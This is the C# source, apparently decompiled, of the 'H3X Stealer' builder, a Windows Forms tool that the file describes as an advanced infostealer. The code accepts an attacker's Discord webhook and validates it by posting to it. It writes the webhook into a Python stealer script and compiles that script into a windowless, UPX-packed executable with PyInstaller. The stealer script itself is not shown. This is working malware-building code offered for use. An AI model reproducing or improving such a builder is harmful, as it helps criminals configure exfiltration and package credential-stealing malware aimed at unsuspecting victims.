using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.IO;
using System.Net.Http;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

#nullable enable
namespace H3XStealer;

public class MainForm : Form
{
  private TextBox webhookTextBox;
  private TextBox outputFilenameTextBox;
  private Label H3XStatusLabel;
  private ProgressBar progressBar;
  private TabControl tabControl;
  private TabPage tabPage1;
  private TabPage tabPage2;
  private TabPage tabPage3;

  public MainForm() => this.InitializeUI();

  private void InitializeUI()
  {
    this.Text = "H3X Stealer - By sosaf - Version 1.2 | Discord : discord.gg/ZGwcmWNUtt";
    this.BackColor = Color.FromArgb(25, 0, 50);
    this.ClientSize = new Size(850, 600);
    this.FormBorderStyle = FormBorderStyle.FixedDialog;
    this.MaximizeBox = false;
    this.MinimizeBox = false;
    this.Icon = new Icon("H3XStealer.ico");
    this.tabControl = this.CreateTabControl();
    this.tabPage1 = this.CreateTabPage("H3X - Main");
    this.tabPage2 = this.CreateTabPage("H3X - Informations");
    this.tabPage3 = this.CreateTabPage("H3X - Credits");
    this.tabControl.TabPages.Add(this.tabPage1);
    this.tabControl.TabPages.Add(this.tabPage2);
    this.tabControl.TabPages.Add(this.tabPage3);
    this.Controls.Add((Control) this.tabControl);
    this.tabPage1.Controls.Add((Control) this.CreatePictureBox("H3XStealer.ico", new Point(600, 20), new Size(200, 200)));
    this.webhookTextBox = this.CreateInputField("H3XWebhook (Discord):", new Point(60, 100), 350);
    this.outputFilenameTextBox = this.CreateInputField("H3XOutput (Filename):", new Point(60, 180), 350);
    this.tabPage1.Controls.Add((Control) this.CreateButton("Build Project", new Point(60, 290), new EventHandler(this.BuildButton_Click)));
    this.tabPage1.Controls.Add((Control) this.CreateButton("Clear Fields", new Point(250, 290), new EventHandler(this.ClearButton_Click)));
    this.tabPage1.Controls.Add((Control) this.CreateButton("H3X Updater", new Point(440, 290), new EventHandler(this.H3XUpdater)));
    int num1 = 200;
    int num2 = 50;
    int num3 = 70;
    int num4 = 40;
    int x = (this.ClientSize.Width - (3 * num1 + 2 * num3)) / 2;
    int y1 = 50;
    int y2 = y1 + num2 + num4;
    int y3 = y2 + num2 + num4;
    this.tabPage3.Controls.Add((Control) this.CreateButton2("3x3", new Point(x, y1), new Action<string, string>(this.ShowH3XThankYouMessage)));
    this.tabPage3.Controls.Add((Control) this.CreateButton2("sosaf", new Point(x + num1 + num3, y1), new Action<string, string>(this.ShowH3XThankYouMessage)));
    this.tabPage3.Controls.Add((Control) this.CreateButton2("Mentale", new Point(x + 2 * (num1 + num3), y1), new Action<string, string>(this.ShowH3XThankYouMessage)));
    this.tabPage3.Controls.Add((Control) this.CreateButton2("choumi1", new Point(x, y2), new Action<string, string>(this.ShowH3XThankYouMessage)));
    this.tabPage3.Controls.Add((Control) this.CreateButton2("tasty crousty", new Point(x + num1 + num3, y2), new Action<string, string>(this.ShowH3XThankYouMessage)));
    this.tabPage3.Controls.Add((Control) this.CreateButton2("moumou", new Point(x + 2 * (num1 + num3), y2), new Action<string, string>(this.ShowH3XThankYouMessage)));
    this.H3XStatusLabel = this.CreateLabel("H3XStatus: Waiting...", new Point(60, 360), 12, FontStyle.Bold, new Color?(Color.FromArgb(138, 43, 226)));
    Panel panel1 = new Panel();
    panel1.Location = new Point(60, 390);
    panel1.Size = new Size(350, 30);
    panel1.BackColor = Color.FromArgb(20, 0, 40);
    panel1.BorderStyle = BorderStyle.Fixed3D;
    Panel panel2 = panel1;
    this.tabPage1.Controls.Add((Control) panel2);
    ProgressBar progressBar = new ProgressBar();
    progressBar.Location = new Point(0, 0);
    progressBar.Size = new Size(350, 30);
    progressBar.Style = ProgressBarStyle.Continuous;
    progressBar.Value = 0;
    progressBar.ForeColor = Color.FromArgb(138, 43, 226);
    progressBar.BackColor = Color.FromArgb(20, 0, 40);
    this.progressBar = progressBar;
    panel2.Controls.Add((Control) this.progressBar);
    this.tabPage1.Controls.Add((Control) this.H3XStatusLabel);
    this.tabPage2.Controls.Add((Control) this.CreatePictureBox("H3XStealer.ico", new Point(20, 20), new Size(200, 200)));
    this.tabPage2.Controls.Add((Control) this.CreateLabel("\n\n\n\nDeveloped exclusively by sosaf\n\nH3X Stealer is an advanced InfoStealer,\nDesigned using C# and Python, for menu and stealer.\ndeveloped in 2025 by sosaf, it draws inspiration from various other stealer tools\nbut is tailored to deliver a powerful and free solution.\n\nRegular updates are released to ensure optimal performance and security, making H3X Stealer\none of the most reliable and up-to-date tools available.\n\nThank you for choosing H3X Stealer. Stay tuned for future enhancements!\n\nJoin our community and stay informed: discord.gg/ZGwcmWNUtt\n", new Point(20, 150), 12, FontStyle.Bold, new Color?(Color.FromArgb(138, 43, 226))));
  }

  private TabControl CreateTabControl()
  {
    TabControl tabControl1 = new TabControl();
    tabControl1.Size = new Size(850, 600);
    tabControl1.Location = new Point(0, 0);
    tabControl1.Font = new Font("Segoe UI", 10f);
    tabControl1.BackColor = Color.FromArgb(40, 0, 80);
    tabControl1.ItemSize = new Size(200, 40);
    tabControl1.DrawMode = TabDrawMode.OwnerDrawFixed;
    TabControl tabControl = tabControl1;
    tabControl.TabPages.Clear();
    tabControl.DrawItem += (DrawItemEventHandler) ((sender, e) =>
    {
      TabPage tabPage = tabControl.TabPages[e.Index];
      Rectangle bounds = e.Bounds;
      using (Brush brush = (Brush) new SolidBrush(Color.FromArgb(40, 0, 80)))
        e.Graphics.FillRectangle(brush, bounds);
      using (Pen pen = new Pen(Color.FromArgb(138, 43, 226), 1f))
        e.Graphics.DrawRectangle(pen, bounds);
      using (Brush brush = (Brush) new SolidBrush(Color.White))
        e.Graphics.DrawString(tabPage.Text, tabControl.Font, brush, (float) (bounds.X + 10), (float) (bounds.Y + 10));
    });
    foreach (TabPage tabPage in tabControl.TabPages)
    {
      tabPage.BackColor = Color.FromArgb(40, 0, 80);
      tabPage.ForeColor = Color.FromArgb(138, 43, 226);
    }
    return tabControl;
  }

  private TabPage CreateTabPage(string text)
  {
    TabPage tabPage1 = new TabPage(text);
    tabPage1.BackColor = Color.FromArgb(30, 0, 60);
    TabPage tabPage = tabPage1;
    LinearGradientBrush gradientBrush = new LinearGradientBrush(tabPage.ClientRectangle, Color.FromArgb(50, 0, 100), Color.FromArgb(20, 0, 40), 45f);
    tabPage.Paint += (PaintEventHandler) ((sender, e) => e.Graphics.FillRectangle((Brush) gradientBrush, tabPage.ClientRectangle));
    return tabPage;
  }

  private PictureBox CreatePictureBox(string imageFileName, Point location, Size size)
  {
    PictureBox pictureBox = new PictureBox();
    pictureBox.Image = Image.FromFile(imageFileName);
    pictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
    pictureBox.Size = size;
    pictureBox.Location = location;
    return pictureBox;
  }

  private Label CreateLabel(
    string text,
    Point location,
    int fontSize,
    FontStyle fontStyle,
    Color? foreColor = null)
  {
    Label label = new Label();
    label.Text = text;
    label.Font = new Font("Segoe UI", (float) fontSize, fontStyle);
    label.ForeColor = foreColor ?? Color.FromArgb(30, 30, 30);
    label.Location = location;
    label.AutoSize = true;
    label.BackColor = Color.Transparent;
    return label;
  }

  private Button CreateButton(string text, Point location, EventHandler clickEventHandler)
  {
    Button button1 = new Button();
    button1.Text = text;
    button1.BackColor = Color.FromArgb(75, 0, 130);
    button1.ForeColor = Color.White;
    button1.Size = new Size(180, 45);
    button1.Location = location;
    button1.FlatStyle = FlatStyle.Flat;
    button1.Font = new Font("Segoe UI", 12f, FontStyle.Bold);
    button1.Cursor = Cursors.Hand;
    Button button = button1;
    button.FlatAppearance.BorderSize = 0;
    button.MouseEnter += (EventHandler) ((s, e) => button.BackColor = Color.FromArgb(138, 43, 226));
    button.MouseLeave += (EventHandler) ((s, e) => button.BackColor = Color.FromArgb(75, 0, 130));
    button.Click += clickEventHandler;
    return button;
  }

  private TextBox CreateInputField(string labelText, Point location, int width)
  {
    this.tabPage1.Controls.Add((Control) this.CreateLabel(labelText, new Point(location.X, location.Y - 30), 12, FontStyle.Bold, new Color?(Color.FromArgb(138, 43, 226))));
    Panel panel1 = new Panel();
    panel1.Size = new Size(width + 20, 40);
    panel1.Location = location;
    panel1.BackColor = Color.FromArgb(20, 0, 40);
    panel1.BorderStyle = BorderStyle.FixedSingle;
    panel1.Padding = new Padding(5);
    Panel panel2 = panel1;
    TextBox textBox = new TextBox();
    textBox.Size = new Size(width, 30);
    textBox.Location = new Point(10, 5);
    textBox.Font = new Font("Segoe UI", 12f);
    textBox.ForeColor = Color.White;
    textBox.BackColor = Color.FromArgb(40, 0, 80);
    textBox.MaxLength = 200;
    textBox.TextAlign = HorizontalAlignment.Left;
    TextBox inputField = textBox;
    panel2.Controls.Add((Control) inputField);
    this.tabPage1.Controls.Add((Control) panel2);
    return inputField;
  }

  private async void BuildButton_Click(object sender, EventArgs e)
  {
    string webhookUrl = this.webhookTextBox.Text;
    string outputFilename = this.outputFilenameTextBox.Text;
    bool flag = string.IsNullOrWhiteSpace(webhookUrl);
    if (!flag)
      flag = !await this.IsValidWebhook(webhookUrl).ConfigureAwait(false);
    if (flag)
    {
      this.ShowH3XErrorMessage("Invalid Webhook URL", "H3XError");
      webhookUrl = (string) null;
      outputFilename = (string) null;
    }
    else
    {
      this.ReplaceWebhookInMainPy(webhookUrl);
      if (string.IsNullOrWhiteSpace(outputFilename))
        outputFilename = "default_output";
      await this.BuildProjectAsync(outputFilename).ConfigureAwait(false);
      webhookUrl = (string) null;
      outputFilename = (string) null;
    }
  }

  private void ShowH3XThankYouMessage(string message, string title)
  {
    int num = (int) MessageBox.Show("❤️", "H3X Thank you", MessageBoxButtons.OK, MessageBoxIcon.None);
    System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo
    {
      FileName = "https://discord.gg/ZGwcmWNUtt",
      UseShellExecute = true
    });
  }

  private async Task<bool> IsValidWebhook(string webhookUrl)
  {
    try
    {
      using (HttpClient client = new HttpClient())
        return (await client.PostAsync(webhookUrl, (HttpContent) new StringContent("{\"content\":\" **<< H3X Stealer - discord.gg/ZGwcmWNUtt - Webhook is ready ! >>**\"}", Encoding.UTF8, "application/json")).ConfigureAwait(false)).IsSuccessStatusCode;
    }
    catch (HttpRequestException ex)
    {
      this.ShowH3XErrorMessage("H3XError: Unable to connect to the webhook URL.", "Connection H3XError");
      return false;
    }
  }

  private void ShowH3XErrorMessage(string message, string title)
  {
    int num = (int) MessageBox.Show(message, title, MessageBoxButtons.OK, MessageBoxIcon.Hand);
  }

  private Button CreateButton2(
    string text,
    Point location,
    Action<string, string> showMessageAction)
  {
    Button button1 = new Button();
    button1.Text = text;
    button1.BackColor = Color.FromArgb(75, 0, 130);
    button1.ForeColor = Color.White;
    button1.Size = new Size(200, 50);
    button1.Location = location;
    button1.FlatStyle = FlatStyle.Flat;
    button1.Font = new Font("Segoe UI", 14f, FontStyle.Bold);
    button1.Cursor = Cursors.Hand;
    Button button = button1;
    button.FlatAppearance.BorderSize = 0;
    
    if (text == "3x3")
    {
      button.MouseEnter += (EventHandler) ((s, e) =>
      {
        if (button.BackColor != Color.Green)
          button.BackColor = Color.FromArgb(128, 0, 128);
      });
      button.MouseLeave += (EventHandler) ((s, e) =>
      {
        if (button.BackColor != Color.Green)
          button.BackColor = Color.FromArgb(75, 0, 130);
      });
      button.Click += (EventHandler) ((sender, e) =>
      {
        button.BackColor = button.BackColor == Color.Green ? Color.FromArgb(128, 0, 128) : Color.Green;
        showMessageAction("In development coming soon...", "H3XStealer");
      });
    }
    else if (text == "choumi1" || text == "sosaf" || text == "Mentale" || text == "tasty crousty" || text == "moumou")
    {
      button.MouseEnter += (EventHandler) ((s, e) =>
      {
        if (button.BackColor != Color.Green)
          button.BackColor = Color.FromArgb(128, 0, 128);
      });
      button.MouseLeave += (EventHandler) ((s, e) =>
      {
        if (button.BackColor != Color.Green)
          button.BackColor = Color.FromArgb(75, 0, 130);
      });
    }
    return button;
  }

  private void ReplaceWebhookInMainPy(string webhookUrl)
  {
    string path = Path.Combine(Application.StartupPath, "func", "H3XStealer.py");
    if (File.Exists(path))
    {
      string contents = File.ReadAllText(path).Replace("%WEBHOOK%", webhookUrl);
      File.WriteAllText(path, contents);
    }
    else
      this.ShowH3XErrorMessage("H3XStealer.py file not found!", "H3XError");
  }

  private async Task BuildProjectAsync(string outputFilename)
  {
    this.H3XStatusLabel.Text = $"H3XStatus: Building your file: {outputFilename}...";
    this.progressBar.Visible = true;
    this.progressBar.Value = 0;
    string mainPyPath = Path.Combine(Application.StartupPath, "func", "H3XStealer.py");
    string originalPyPath = Path.Combine(Application.StartupPath, "func", "H3XStealer_Backup.py");
    if (File.Exists(mainPyPath))
    {
      File.Copy(mainPyPath, Path.Combine(Application.StartupPath, "build", outputFilename + ".py"), true);
      ConfiguredTaskAwaitable configuredTaskAwaitable = Task.Delay(1000).ConfigureAwait(false);
      await configuredTaskAwaitable;
      this.progressBar.Value = 50;
      this.H3XStatusLabel.Text = $"H3XStatus: Build Complete for: {outputFilename}...";
      if (File.Exists(originalPyPath))
      {
        File.WriteAllText(mainPyPath, File.ReadAllText(originalPyPath));
        this.H3XStatusLabel.Text = $"H3XStatus: {outputFilename} updated with H3XStealer_Backup.py content.";
      }
      else
        this.ShowH3XErrorMessage("H3XStealer_Backup.py file not found!", "H3XError");
      int num = (int) MessageBox.Show($"Build Complete! File saved as {outputFilename}.py", "Success", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
      configuredTaskAwaitable = this.CompileToExe(outputFilename).ConfigureAwait(false);
      await configuredTaskAwaitable;
    }
    else
      this.ShowH3XErrorMessage("H3XStealer.py file not found!", "H3XError");
    this.progressBar.Visible = false;
    mainPyPath = (string) null;
    originalPyPath = (string) null;
  }

  private async Task CompileToExe(string outputFilename)
  {
    string str = $"pyinstaller --onefile --noconsole --clean --noconfirm --upx-dir UPX --version-file AssemblyFile\\version.txt \"{Path.Combine(Application.StartupPath, "build", outputFilename + ".py")}\"";
    try
    {
      Process process = Process.Start(new ProcessStartInfo()
      {
        FileName = "cmd.exe",
        Arguments = "/c " + str,
        RedirectStandardOutput = true,
        UseShellExecute = false,
        CreateNoWindow = true
      });
      process.BeginOutputReadLine();
      await process.WaitForExitAsync().ConfigureAwait(false);
      if (process.ExitCode == 0)
      {
        int num = (int) MessageBox.Show("The EXE has been compiled successfully!", "Compilation Complete", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
      }
      else
        this.ShowH3XErrorMessage("An H3XError occurred during compilation. Please check the PyInstaller log.", "Compilation H3XError");
      process = (Process) null;
    }
    catch (Exception ex)
    {
      this.ShowH3XErrorMessage("H3XError running PyInstaller: " + ex.Message, "Compilation H3XError");
    }
  }

  private async void H3XUpdater(object sender, EventArgs e)
  {
    this.H3XStatusLabel.Text = "H3XStatus: Checking Python and .NET Runtime...";
    this.progressBar.Visible = true;
    this.progressBar.Value = 0;
    if (!await this.IsPythonInstalled().ConfigureAwait(false))
    {
      this.ShowH3XErrorMessage("Python is not installed. Please install Python before continuing.", "H3XError");
      this.progressBar.Visible = false;
    }
    else if (!this.IsDotNetRuntimeInstalled())
    {
      this.ShowH3XErrorMessage(".NET Runtime is not installed. Please install it before continuing.", "H3XError");
      this.progressBar.Visible = false;
    }
    else
    {
      string[] strArray = new string[176 /*0xB0*/]
      {
        "ctypes",
        "crypto",
        "platform",
        "json",
        "sys",
        "shutil",
        "sqlite3",
        "re",
        "os",
        "asyncio",
        "aiohttp",
        "base64",
        "time",
        "requests",
        "pyinstaller",
        "colorama",
        "numpy",
        "pandas",
        "flask",
        "beautifulsoup4",
        "lxml",
        "cryptography",
        "matplotlib",
        "pytest",
        "scikit-learn",
        "pillow",
        "flask_sqlalchemy",
        "tensorflow",
        "keras",
        "django",
        "seaborn",
        "plotly",
        "dash",
        "sympy",
        "pytest-cov",
        "sqlalchemy",
        "celery",
        "boto3",
        "pytz",
        "xlrd",
        "openpyxl",
        "flask-restful",
        "pyodbc",
        "twisted",
        "paramiko",
        "pyqt5",
        "scrapy",
        "pytest-django",
        "pytorch",
        "opencv-python",
        "tqdm",
        "geopy",
        "nltk",
        "wordcloud",
        "requests_oauthlib",
        "flask-login",
        "flask-migrate",
        "flask-wtf",
        "wtforms",
        "sqlalchemy-utils",
        "pytest-xdist",
        "gunicorn",
        "uwsgi",
        "redis",
        "gevent",
        "pyyaml",
        "pika",
        "cx_Oracle",
        "py2exe",
        "pyautogui",
        "fabric",
        "watchdog",
        "pyserial",
        "pywin32",
        "pyttsx3",
        "pygame",
        "virtualenv",
        "tox",
        "pdbpp",
        "loguru",
        "faker",
        "nmap",
        "pyspellchecker",
        "markovify",
        "textblob",
        "flask-socketio",
        "websockets",
        "slack_sdk",
        "azure-storage-blob",
        "fastapi",
        "sqlparse",
        "nose",
        "pytest-bdd",
        "pytest-factoryboy",
        "flask-cors",
        "flask-mail",
        "flask-admin",
        "flask-session",
        "flask-jwt-extended",
        "sqlalchemy-migrate",
        "requests-toolbelt",
        "pandas-profiling",
        "networkx",
        "xlwt",
        "psycopg2",
        "apache-beam",
        "h5py",
        "python-dateutil",
        "shapely",
        "pyarrow",
        "djangorestframework",
        "django-crispy-forms",
        "pyspark",
        "xlutils",
        "sqlparse",
        "pytest-mock",
        "flask-caching",
        "flask-oauthlib",
        "flask-security",
        "flask-babel",
        "flask-ckeditor",
        "python-dotenv",
        "pyquery",
        "pywinusb",
        "suds",
        "requests-cache",
        "connexion",
        "gevent-websocket",
        "jupyter",
        "notebook",
        "ipython",
        "aiofiles",
        "python-gitlab",
        "xmltodict",
        "selenium",
        "docker",
        "docker-py",
        "pytest-runner",
        "pytest-timeout",
        "pytest-watch",
        "pytest-flask",
        "Flask-Celery-Helper",
        "flask-bcrypt",
        "django-allauth",
        "flask-apispec",
        "PyCObject",
        "pytest-selenium",
        "flask-marshmallow",
        "twilio",
        "python-nmap",
        "geoalchemy2",
        "pycoingecko",
        "speedtest-cli",
        "natsort",
        "python-Levenshtein",
        "Flask-RESTPlus",
        "flask-openid",
        "kivy",
        "easygui",
        "opencv-contrib-python",
        "pyTelegramBotAPI",
        "tkinter",
        "pygraphviz",
        "fastparquet",
        "luigi",
        "pytest-benchmark",
        "pydantic",
        "psycopg2-binary",
        "pygooglechart",
        "minio",
        "urllib3",
        "pyotp",
        "appdirs",
        "xgboost",
        "datadog",
        "scrapy"
      };
      for (int index = 0; index < strArray.Length; ++index)
      {
        string module = strArray[index];
        if (!await this.IsModuleInstalled(module).ConfigureAwait(false))
        {
          this.H3XStatusLabel.Text = $"H3XStatus: Installing {module}...";
          await this.InstallModule(module).ConfigureAwait(false);
          ProgressBar progressBar = this.progressBar;
          progressBar.Value = progressBar.Value;
        }
        else
          this.H3XStatusLabel.Text = $"H3XStatus: {module} already installed.";
        module = (string) null;
      }
      strArray = (string[]) null;
      this.H3XStatusLabel.Text = "H3XStatus: Debug Complete!";
      this.progressBar.Visible = false;
      int num = (int) MessageBox.Show("Debugging complete. All the bugs are now dead.", "Debugging Complete", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }
  }

  private async Task<bool> IsPythonInstalled()
  {
    try
    {
      Process process = new Process()
      {
        StartInfo = new ProcessStartInfo()
        {
          FileName = "python",
          Arguments = "--version",
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true
        }
      };
      process.Start();
      string str = await process.StandardOutput.ReadToEndAsync().ConfigureAwait(false);
      process.WaitForExit();
      return str.StartsWith("Python");
    }
    catch
    {
      return false;
    }
  }

  private bool IsDotNetRuntimeInstalled()
  {
    using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full"))
      return registryKey?.GetValue("Release") != null;
  }

  private async Task<bool> IsModuleInstalled(string moduleName)
  {
    try
    {
      Process process = new Process()
      {
        StartInfo = new ProcessStartInfo()
        {
          FileName = "python",
          Arguments = "-m pip show " + moduleName,
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true
        }
      };
      process.Start();
      string str1 = await process.StandardOutput.ReadToEndAsync().ConfigureAwait(false);
      process.WaitForExit();
      string str2 = "Name: " + moduleName;
      return str1.Contains(str2);
    }
    catch (Exception ex)
    {
      this.ShowH3XErrorMessage($"H3XError checking if module {moduleName} is installed: {ex.Message}", "H3XError");
      return false;
    }
  }

  private async Task InstallModule(string moduleName)
  {
    try
    {
      Process process = new Process()
      {
        StartInfo = new ProcessStartInfo()
        {
          FileName = "python",
          Arguments = "-m pip install " + moduleName,
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true
        }
      };
      process.Start();
      string str = await process.StandardOutput.ReadToEndAsync().ConfigureAwait(false);
      process.WaitForExit();
      process = (Process) null;
    }
    catch (Exception ex)
    {
      this.ShowH3XErrorMessage($"H3XError installing module {moduleName}: {ex.Message}", "H3XError");
    }
  }

  private void ClearButton_Click(object sender, EventArgs e)
  {
    this.webhookTextBox.Clear();
    this.outputFilenameTextBox.Clear();
    this.H3XStatusLabel.Text = "H3XStatus: Goated by sosaf";
    this.progressBar.Visible = false;
  }
}